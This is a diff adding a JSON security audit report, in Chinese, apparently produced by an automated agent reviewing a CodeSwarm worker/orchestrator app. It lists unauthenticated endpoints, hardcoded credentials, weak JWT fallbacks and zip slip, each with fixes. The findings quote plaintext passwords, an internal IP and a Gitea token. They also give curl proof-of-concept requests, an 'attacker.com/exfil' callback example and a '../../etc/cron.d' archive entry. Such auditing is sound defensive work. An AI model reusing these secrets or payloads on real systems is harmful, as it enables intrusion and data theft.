@@ -1,0 +1,563 @@
+{
+  "agent": "audit-spec-infra",
+  "files_read_ref": ".opencode/run/artifacts/audit-spec-infra.catalog.json#files_read",
+  "checked_endpoints_ref": ".opencode/run/artifacts/audit-spec-infra.catalog.json#checked_endpoints",
+  "checked_patterns": [
+    {
+      "name": "trust_boundary_misconfig",
+      "evidence_refs": ["INFRA-001", "INFRA-003", "INFRA-006"]
+    },
+    {
+      "name": "exposed_internal_service",
+      "evidence_refs": ["INFRA-004", "INFRA-005", "INFRA-007"]
+    },
+    {
+      "name": "insecure_gateway_rewrite",
+      "evidence_refs": ["INFRA-006", "INFRA-005"]
+    },
+    {
+      "name": "secret_exposure",
+      "evidence_refs": ["INFRA-002", "INFRA-003", "INFRA-005"]
+    }
+  ],
+  "completed_steps": [
+    {
+      "name": "identify_deployment_boundary",
+      "evidence_refs": ["INFRA-001", "INFRA-005", "INFRA-006"]
+    },
+    {
+      "name": "identify_cross_service_trust",
+      "evidence_refs": ["INFRA-001", "INFRA-003", "INFRA-006"]
+    },
+    {
+      "name": "check_runtime_exposure",
+      "evidence_refs": ["INFRA-001", "INFRA-002", "INFRA-003", "INFRA-004", "INFRA-005", "INFRA-007", "INFRA-008"]
+    }
+  ],
+  "findings": [
+    {
+      "id": "INFRA-001",
+      "title": "CodeSwarm Worker 回调端点完全缺少认证",
+      "file": "src/app/api/codeswarm/worker/result/route.ts",
+      "line": 273,
+      "severity": "CRITICAL",
+      "cwe": "CWE-306",
+      "confidence": "HIGH",
+      "impact": "攻击者可伪造 taskId/status/nodeId 向任意任务提交虚假结果（包括 completed 和 failed），导致：1) 执行流程图被毒化；2) 触发 executeVulnerabilityParseAsync 调用 opencode CLI 执行任意命令；3) 通过 fake taskId 向 /api/v1/vulnerabilities 批量注入虚假漏洞数据",
+      "evidence_level": "VERIFIED",
+      "source": {
+        "file": "src/app/api/codeswarm/worker/result/route.ts",
+        "line": 273,
+        "code": "export async function POST(request: Request) { ... const { taskId, nodeId, status, result, error, reportContent } = body; ... }"
+      },
+      "propagation": [
+        {
+          "file": "src/app/api/codeswarm/worker/result/route.ts",
+          "line": 284,
+          "summary": "UPDATE \"CodeswarmTask\" SET state = ${finalState}"
+        },
+        {
+          "file": "src/app/api/codeswarm/worker/result/route.ts",
+          "line": 120,
+          "summary": "内部调用 /api/v1/vulnerabilities 无认证头"
+        },
+        {
+          "file": "src/app/api/codeswarm/worker/result/route.ts",
+          "line": 159,
+          "summary": "executeVulnerabilityParseAsync 通过 spawn 执行 shell 命令"
+        }
+      ],
+      "sink": {
+        "file": "src/app/api/codeswarm/worker/result/route.ts",
+        "line": 351,
+        "code": "executeVulnerabilityParseAsync(taskId, taskInstanceForParse.projectPath);"
+      },
+      "control_chain": [
+        {
+          "file": "src/app/api/codeswarm/worker/result/route.ts",
+          "line": 273,
+          "summary": "入口：POST 方法无任何认证中间件或装饰器"
+        },
+        {
+          "file": "src/app/api/codeswarm/worker/result/route.ts",
+          "line": 284,
+          "summary": "直接更新 CodeswarmTask 状态（任意 taskId）"
+        },
+        {
+          "file": "src/app/api/codeswarm/worker/result/route.ts",
+          "line": 112,
+          "summary": "内部调用 /api/v1/vulnerabilities 无认证头"
+        },
+        {
+          "file": "src/app/api/codeswarm/worker/result/route.ts",
+          "line": 351,
+          "summary": "成功路径触发 executeVulnerabilityParseAsync（spawn shell）"
+        }
+      ],
+      "artifact": {
+        "file": "src/app/api/codeswarm/worker/event/route.ts",
+        "line": 1,
+        "summary": "event 端点也无认证，任意方可注入事件"
+      },
+      "runtime_impact": "任意攻击者可通过直接 HTTP POST 到 /api/codeswarm/worker/result 伪造任意任务结果，注入漏洞数据到数据库，并可触发 shell 命令执行",
+      "evidence_ref": "E:INFRA-001-01",
+      "poc": [
+        "curl -X POST http://target:3000/api/codeswarm/worker/result -H 'Content-Type: application/json' -d '{\"taskId\":\"fake-task-1\",\"nodeId\":\"worker-1\",\"status\":\"completed\",\"result\":\"\"}'"
+      ],
+      "fix": [
+        "在 /api/codeswarm/worker/* 端点添加 JWT Worker Token 强制校验",
+        "禁止从 task payload 覆盖 callbackUrl（移除 getCallbackUrl 的 payload 覆盖逻辑）",
+        "在 /api/v1/vulnerabilities 添加认证检查（至少要求内部 service token）"
+      ]
+    },
+    {
+      "id": "INFRA-002",
+      "title": ".env 文件硬编码生产凭据到代码仓库",
+      "file": ".env",
+      "line": 3,
+      "severity": "CRITICAL",
+      "cwe": "CWE-798",
+      "confidence": "HIGH",
+      "impact": "仓库泄露将导致：PostgreSQL 数据库完全访问、SFTP 文件服务器控制、Gitea 仓库写权限、MinIO 对象存储访问、Redis 队列操纵、内部网络拓扑暴露",
+      "evidence_level": "VERIFIED",
+      "source": {
+        "file": ".env",
+        "line": 3,
+        "code": "DATABASE_URL=\"postgresql://postgres:Huawei12%23%24@172.31.23.182:5432/copy\""
+      },
+      "propagation": [
+        {
+          "file": ".env",
+          "line": 16,
+          "summary": "SFTP_PASSWORD=\"Huawei12#$\" (明文 SFTP 密码)"
+        },
+        {
+          "file": ".env",
+          "line": 36,
+          "summary": "GITEA_TOKEN=\"2a0eb308a797b6485d76ca35144f16224b2e7fb4\" (Gitea 写令牌)"
+        },
+        {
+          "file": ".env",
+          "line": 44,
+          "summary": "SKILLS_GITEA_TOKEN 重复使用同一令牌"
+        },
+        {
+          "file": ".env",
+          "line": 52,
+          "summary": "MINIO_ACCESS_KEY / MINIO_SECRET_KEY 硬编码"
+        }
+      ],
+      "sink": {
+        "file": ".env",
+        "line": 1,
+        "code": "Entire .env file containing DB password, SFTP credentials, Gitea tokens (x2), MinIO credentials, Redis URL"
+      },
+      "control_chain": [
+        {
+          "file": ".env",
+          "line": 3,
+          "summary": "PostgreSQL 连接字符串含明文密码"
+        },
+        {
+          "file": ".env",
+          "line": 16,
+          "summary": "SFTP 明文密码和用户名"
+        },
+        {
+          "file": ".env",
+          "line": 36,
+          "summary": "Gitea API Token（仓库写权限）"
+        },
+        {
+          "file": ".env",
+          "line": 44,
+          "summary": "Skills Gitea API Token（仓库写权限）"
+        },
+        {
+          "file": ".env",
+          "line": 52,
+          "summary": "MinIO 密钥对"
+        }
+      ],
+      "artifact": {
+        "file": ".env",
+        "line": 1,
+        "summary": ".env 文件存在于工作目录并被追踪，包含完整生产凭据"
+      },
+      "runtime_impact": "仓库泄露将导致：PostgreSQL 数据库完全访问、SFTP 文件服务器控制、Gitea 仓库写权限、MinIO 对象存储访问、Redis 队列操纵",
+      "evidence_ref": "E:INFRA-002-01",
+      "poc": [
+        "git log --all -- .env 可查看 .env 文件历史",
+        "直接读取 .env 文件可见所有凭据"
+      ],
+      "fix": [
+        "将 .env 从版本控制中移除（添加到 .gitignore），使用环境变量注入或密钥管理服务（Vault/AWS Secrets Manager）",
+        "轮换所有暴露的密码和令牌：DB密码、SFTP密码、Gitea Token、MinIO 密钥",
+        "使用 dotenv-vault 或类似工具加密存储环境变量"
+      ]
+    },
+    {
+      "id": "INFRA-003",
+      "title": "JWT_SECRET 硬编码不安全默认值且 Worker Token 与 User Token 共享密钥",
+      "file": "src/lib/codeswarm-worker-auth.ts",
+      "line": 3,
+      "severity": "CRITICAL",
+      "cwe": "CWE-321",
+      "confidence": "HIGH",
+      "impact": "攻击者知道回退密钥后可以：1）伪造任意 Worker 的 worker token 向 orchestrator 提交结果；2）如果 JWT_SECRET 与用户认证共享同一变量，可伪造用户身份；3）旁路所有 JWT 保护的 API 端点",
+      "evidence_level": "VERIFIED",
+      "source": {
+        "file": "src/lib/codeswarm-worker-auth.ts",
+        "line": 3,
+        "code": "const JWT_SECRET = process.env.JWT_SECRET || 'dev-secret-change-me';"
+      },
+      "propagation": [
+        {
+          "file": "src/lib/codeswarm-worker-auth.ts",
+          "line": 13,
+          "summary": "Worker token 与 user JWT 使用同一密钥签名（无 audience 隔离）"
+        }
+      ],
+      "sink": {
+        "file": "src/lib/codeswarm-worker-auth.ts",
+        "line": 13,
+        "code": "return jwt.sign({ workerId, nodeId, type: 'worker' }, JWT_SECRET, { expiresIn: '7d' });"
+      },
+      "control_chain": [
+        {
+          "file": ".env",
+          "line": 5,
+          "summary": "JWT_SECRET=\"your-secret-key-change-in-production\" - 并非真正的生产密钥"
+        },
+        {
+          "file": "src/lib/codeswarm-worker-auth.ts",
+          "line": 3,
+          "summary": "JWT_SECRET 未设置时回退到 'dev-secret-change-me'"
+        }
+      ],
+      "artifact": {
+        "file": "src/lib/codeswarm-worker-auth.ts",
+        "line": 3,
+        "summary": "Worker token 与 user JWT 使用同一密钥签名的密钥（无 audience 隔离）"
+      },
+      "runtime_impact": "攻击者知道回退密钥后可以伪造任意 Worker 的 token，或如果 JWT_SECRET 与用户认证共享则伪造用户身份",
+      "evidence_ref": "E:INFRA-003-01",
+      "poc": [
+        "使用密钥 'dev-secret-change-me' 或 '.env' 中的 'your-secret-key-change-in-production' 签署任意 worker token",
+        "生成 token 后即可通过 /api/codeswarm/worker/heartbeat 注册假 worker"
+      ],
+      "fix": [
+        "使用独立的 CODESWARM_WORKER_JWT_SECRET 环境变量",
+        "Worker token 必须包含 audience（固定值如 'codeswarm-worker'）和 issuer 声明",
+        "移除回退默认值，JWT_SECRET 未设置时应启动时拒绝启动"
+      ]
+    },
+    {
+      "id": "INFRA-004",
+      "title": "GET /api/codeswarm/nodes 暴露 Worker JWT Token",
+      "file": "src/app/api/codeswarm/nodes/route.ts",
+      "line": 8,
+      "severity": "HIGH",
+      "cwe": "CWE-200",
+      "confidence": "HIGH",
+      "impact": "任何能访问此端点的人可获得有效 Worker JWT Token，用于向 /api/codeswarm/worker/heartbeat 和 /api/codeswarm/worker/result 进行认证（虽然认证目前是可选的），配合 INFRA-001 可完全伪造 Worker 行为",
+      "evidence_level": "VERIFIED",
+      "source": {
+        "file": "src/app/api/codeswarm/nodes/route.ts",
+        "line": 8,
+        "code": "SELECT id, \"nodeId\", address, status, \"maxConcurrent\", \"currentTasks\",\n       token, \"lastHeartbeat\", \"createdAt\", \"updatedAt\""
+      },
+      "propagation": [
+        {
+          "file": "src/app/api/codeswarm/nodes/route.ts",
+          "line": 15,
+          "summary": "Response 返回 workers 数组包含 token 字段（JWT tokens）"
+        }
+      ],
+      "sink": {
+        "file": "src/app/api/codeswarm/nodes/route.ts",
+        "line": 15,
+        "code": "return NextResponse.json({ workers });"
+      },
+      "control_chain": [
+        {
+          "file": "src/app/api/codeswarm/nodes/route.ts",
+          "line": 1,
+          "summary": "端点无认证检查，import 列表不含 authenticateRequest"
+        }
+      ],
+      "artifact": {
+        "file": "src/app/api/codeswarm/nodes/route.ts",
+        "line": 15,
+        "summary": "HTTP 响应中包含纯文本 JWT worker tokens"
+      },
+      "runtime_impact": "任何能访问此端点的人可获得有效的 Worker JWT Token，配合 INFRA-001 可完全伪造 Worker 行为",
+      "evidence_ref": "E:INFRA-004-01",
+      "poc": [
+        "curl http://target:3000/api/codeswarm/nodes 返回 workers 数组，每个包含 token 字段"
+      ],
+      "fix": [
+        "从查询中移除 token 字段",
+        "添加认证和 admin 权限检查"
+      ]
+    },
+    {
+      "id": "INFRA-005",
+      "title": "CodeSwarm Worker 绑定到 0.0.0.0 暴露内部服务",
+      "file": "codeswarm/packages/worker/src/daemon.ts",
+      "line": 91,
+      "severity": "MEDIUM",
+      "cwe": "CWE-200",
+      "confidence": "HIGH",
+      "impact": "其他内部服务、同一 Kubernetes 节点或其他租户可能访问 Worker 的 HTTP 端点（/task 接收含有 apiKey 和模型配置的 task payload）",
+      "evidence_level": "VERIFIED",
+      "source": {
+        "file": "codeswarm/packages/worker/src/daemon.ts",
+        "line": 91,
+        "code": "await this.server.listen({ port: this.config.port, host: '0.0.0.0' });"
+      },
+      "propagation": [
+        {
+          "file": "codeswarm/packages/worker/src/daemon.ts",
+          "line": 76,
+          "summary": "GET /health 暴露节点信息"
+        },
+        {
+          "file": "codeswarm/packages/worker/src/daemon.ts",
+          "line": 44,
+          "summary": "POST /task 接收含 apiKey 的 task payload"
+        }
+      ],
+      "sink": {
+        "file": "codeswarm/packages/worker/src/daemon.ts",
+        "line": 44,
+        "code": "this.server.post('/task', async (request, reply) => { ... 接收含 apiKey 的 payload ... })"
+      },
+      "control_chain": [
+        {
+          "file": "codeswarm/packages/worker/src/daemon.ts",
+          "line": 91,
+          "summary": "Worker 监听 0.0.0.0:${PORT}（默认 8080/8090），可从同一网络段的任何主机访问"
+        }
+      ],
+      "artifact": {
+        "file": "codeswarm/Dockerfile",
+        "line": 104,
+        "summary": "EXPOSE 8080 验证了监听端口"
+      },
+      "runtime_impact": "其他内部服务、同一 Kubernetes 节点或其他租户可能访问 Worker 的 HTTP 端点，提交恶意 task payload",
+      "evidence_ref": "E:INFRA-005-01",
+      "poc": [
+        "从同一网络段的另一台机器访问 http://worker-ip:8080/health 或 http://worker-ip:8080/"
+      ],
+      "fix": [
+        "将 host 绑定改为 127.0.0.1（当 Worker 与 Orchestrator 同机时）或使用 Kubernetes NetworkPolicy/防火墙限制",
+        "Worker /task 端点添加认证（如预共享令牌）"
+      ]
+    },
+    {
+      "id": "INFRA-006",
+      "title": "Worker→Orchestrator 回调缺乏认证，callbackUrl 可被攻击者控制",
+      "file": "codeswarm/packages/worker/src/daemon.ts",
+      "line": 156,
+      "severity": "HIGH",
+      "cwe": "CWE-306",
+      "confidence": "HIGH",
+      "impact": "攻击者通过提交恶意任务 payload（设置 callbackUrl 到自己的服务器）可接收 Worker 的执行结果（包含 codebase 分析结果、漏洞发现等敏感数据）。同时 Worker 回调不带认证，可被中间人攻击。",
+      "evidence_level": "VERIFIED",
+      "source": {
+        "file": "codeswarm/packages/worker/src/daemon.ts",
+        "line": 156,
+        "code": "private getCallbackUrl(payload: TaskPayload): string {\n  return payload.callbackUrl || this.config.orchestratorUrl;\n}"
+      },
+      "propagation": [
+        {
+          "file": "codeswarm/packages/worker/src/daemon.ts",
+          "line": 368,
+          "summary": "postEvent 回调不携带任何认证头"
+        },
+        {
+          "file": "codeswarm/packages/worker/src/daemon.ts",
+          "line": 395,
+          "summary": "postResult 回调不携带任何认证头，结果上传到任意设置的 callbackUrl"
+        }
+      ],
+      "sink": {
+        "file": "codeswarm/packages/worker/src/daemon.ts",
+        "line": 395,
+        "code": "fetch(`${callbackUrl}/api/codeswarm/worker/result`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(result) })"
+      },
+      "control_chain": [
+        {
+          "file": "codeswarm/packages/worker/src/daemon.ts",
+          "line": 156,
+          "summary": "callbackUrl 从 task payload 中读取（攻击者可设置）"
+        },
+        {
+          "file": "codeswarm/packages/worker/src/daemon.ts",
+          "line": 368,
+          "summary": "事件回调无认证头发送"
+        },
+        {
+          "file": "codeswarm/packages/worker/src/daemon.ts",
+          "line": 395,
+          "summary": "结果上传到任意设置的 callbackUrl"
+        }
+      ],
+      "artifact": {
+        "file": "codeswarm/packages/worker/src/daemon.ts",
+        "line": 156,
+        "summary": "callbackUrl 允许攻击者控制 Worker 回调的目标服务器"
+      },
+      "runtime_impact": "攻击者通过提交恶意任务 payload（设置 callbackUrl 到自己的服务器）可接收 Worker 的完整执行结果和漏洞分析数据",
+      "evidence_ref": "E:INFRA-006-01",
+      "poc": [
+        "攻击者设置 callbackUrl='http://attacker.com/exfil'→Worker将分析数据和漏洞结果发送至攻击者服务器"
+      ],
+      "fix": [
+        "移除 payload.callbackUrl 覆盖逻辑，固定使用 orchestratorUrl",
+        "Worker 回调添加 JWT Bearer token 认证头",
+        "验证回调目标必须与配置的 ORCHESTRATOR_URL 域名匹配"
+      ]
+    },
+    {
+      "id": "INFRA-007",
+      "title": "/api/v1/vulnerabilities 端点缺少认证（依赖外部防火墙）",
+      "file": "src/app/api/v1/vulnerabilities/route.ts",
+      "line": 9,
+      "severity": "HIGH",
+      "cwe": "CWE-306",
+      "confidence": "HIGH",
+      "impact": "任何能访问此端点的攻击者可批量注入任意漏洞数据到漏洞管理数据库，造成数据污染和误报",
+      "evidence_level": "VERIFIED",
+      "source": {
+        "file": "src/app/api/v1/vulnerabilities/route.ts",
+        "line": 9,
+        "code": "// 1. 解析请求体（认证由外部防火墙处理）"
+      },
+      "propagation": [
+        {
+          "file": "src/app/api/codeswarm/worker/result/route.ts",
+          "line": 120,
+          "summary": "内部调用 /api/v1/vulnerabilities 同样无认证头"
+        }
+      ],
+      "sink": {
+        "file": "src/app/api/v1/vulnerabilities/route.ts",
+        "line": 129,
+        "code": "const result = await prisma.vulnerability.createMany({ data: batchData, skipDuplicates: true });"
+      },
+      "control_chain": [
+        {
+          "file": "src/app/api/v1/vulnerabilities/route.ts",
+          "line": 9,
+          "summary": "认证完全由注释中的'外部防火墙'处理，代码中无任何校验"
+        }
+      ],
+      "artifact": {
+        "file": "src/app/api/v1/vulnerabilities/route.ts",
+        "line": 1,
+        "summary": "import 列表不含 authenticateRequest 或 api-key-auth"
+      },
+      "runtime_impact": "任何能访问此端点的攻击者可批量注入任意漏洞数据到漏洞管理数据库",
+      "evidence_ref": "E:INFRA-007-01",
+      "poc": [
+        "curl -X POST http://target:3000/api/v1/vulnerabilities -H 'Content-Type: application/json' -d '{\"taskId\":\"some-task\",\"filePath\":\"/fake\",\"vulnerabilities\":[{\"title\":\"Fake Vuln\",\"type\":\"fake\"}]}'"
+      ],
+      "fix": [
+        "添加认证中间件，至少要求 Valid API Key 或内部 Service Token",
+        "v1 API 如果设计为公开端点应添加 API Key 认证，如果为内部使用应添加 IP 白名单或 service-to-service auth"
+      ]
+    },
+    {
+      "id": "INFRA-008",
+      "title": "NFS 文件上传和归档解压缺少路径遍历防护",
+      "file": "src/lib/nfs-upload.ts",
+      "line": 82,
+      "severity": "MEDIUM",
+      "cwe": "CWE-22",
+      "confidence": "MEDIUM",
+      "impact": "攻击者通过上传包含 ../ 路径条目的归档文件，可在 NFS 挂载目录外写入文件",
+      "evidence_level": "HIGH",
+      "source": {
+        "file": "src/lib/nfs-upload.ts",
+        "line": 82,
+        "code": "const remoteFilePath = path.join(remoteDirPath, fileName);"
+      },
+      "propagation": [
+        {
+          "file": "src/lib/nfs-upload.ts",
+          "line": 86,
+          "summary": "adm-zip.extractAllTo 不验证 zip 内的路径（zip slip 漏洞）"
+        }
+      ],
+      "sink": {
+        "file": "src/lib/nfs-upload.ts",
+        "line": 86,
+        "code": "const zip = new AdmZip(archivePath);\nzip.extractAllTo(targetDir, true);"
+      },
+      "control_chain": [
+        {
+          "file": "src/lib/nfs-upload.ts",
+          "line": 82,
+          "summary": "path.join 用户控制的 fileName 可能导致目录穿越"
+        },
+        {
+          "file": "src/lib/nfs-upload.ts",
+          "line": 86,
+          "summary": "adm-zip 的 extractAllTo 对 zip 内文件名无路径遍历检查"
+        }
+      ],
+      "artifact": {
+        "file": "src/lib/nfs-upload.ts",
+        "line": 1,
+        "summary": "NFS 文件上传缺少路径规范化校验和 zip slip 防护"
+      },
+      "runtime_impact": "攻击者通过上传含 ../ 路径的归档文件，可在 NFS 挂载目录外写入文件，可能造成更大范围破坏",
+      "evidence_ref": "E:INFRA-008-01",
+      "poc": [
+        "创建 zip 包含条目 '../../etc/cron.d/malicious'，通过 uploadAndExtractArchive 上传后文件将被写入 NFS 挂载点外的路径"
+      ],
+      "fix": [
+        "对 fileName 执行路径规范化校验，拒绝包含 '..' 或路径分隔符的文件名",
+        "在 adm-zip 解压后验证每个文件的目标路径是否在允许的基目录内"
+      ]
+    }
+  ],
+  "unfinished": [
+    {
+      "item": "Docker 容器安全扫描（Seccomp/AppArmor 配置）",
+      "reason": "Dockerfile 未设置安全选项；需要运行 trivy/dockle 等工具进行容器安全扫描以确认完整 attack surface"
+    },
+    {
+      "item": "Redis 认证和加密配置",
+      "reason": "REDIS_URL 未包含密码和 TLS，但未确认是否需要密码；取决于部署环境"
+    },
+    {
+      "item": "PostgreSQL 连接字符串 TLS 配置",
+      "reason": "DATABASE_URL 中 connection_limit/pool_timeout 等参数已设置，但未验证 sslmode；取决于实际 PostgreSQL 部署策略"
+    },
+    {
+      "item": "Worker Docker 镜像基础镜像安全更新",
+      "reason": "node:20-bookworm-slim 镜像需要检查 CVE 列表，未在本次审计范围"
+    },
+    {
+      "item": "代码仓库中 .env 文件的 git 历史清理",
+      "reason": "需要检查 .env 是否已在 git 历史中；如果是则需要强制轮换凭据并清理 git 历史"
+    }
+  ],
+  "catalog_path": ".opencode/run/artifacts/audit-spec-infra.catalog.json",
+  "evidence_path": ".opencode/run/artifacts/audit-spec-infra.evidence.json",
+  "narrative_path": ".opencode/run/artifacts/audit-spec-infra.md",
+  "self_status": {
+    "status": "SOFT_FAIL",
+    "reasons": [
+      "发现 2 个 CRITICAL 级别的信任边界缺陷（INFRA-001: Worker 回调无认证, INFRA-002: .env 凭据泄露）",
+      "发现 1 个 CRITICAL 级别的密钥安全缺陷（INFRA-003: JWT_SECRET 回退默认值）",
+      "发现 3 个 HIGH 级别的服务暴露缺陷（INFRA-004: 节点 token 泄露, INFRA-006: 回调无认证, INFRA-007: v1 漏洞接口无认证）",
+      "所有 required_patterns 已覆盖：trust_boundary_misconfig, exposed_internal_service, insecure_gateway_rewrite, secret_exposure",
+      "所有 required_steps 已完成：identify_deployment_boundary, identify_cross_service_trust, check_runtime_exposure"
+    ],
+    "runtime_evidence_count": 16
+  }
+}
